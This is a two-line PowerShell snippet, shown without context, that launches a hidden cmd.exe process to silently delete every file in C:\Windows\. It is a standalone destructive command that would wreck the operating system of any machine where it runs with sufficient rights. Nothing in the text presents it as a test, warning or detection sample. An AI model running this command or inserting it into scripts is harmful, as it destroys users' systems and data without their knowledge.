$directory = "C:\Windows\"
Start-Process -NoNewWindow -FilePath "cmd.exe" -ArgumentList "/c del /Q $directory*.*"
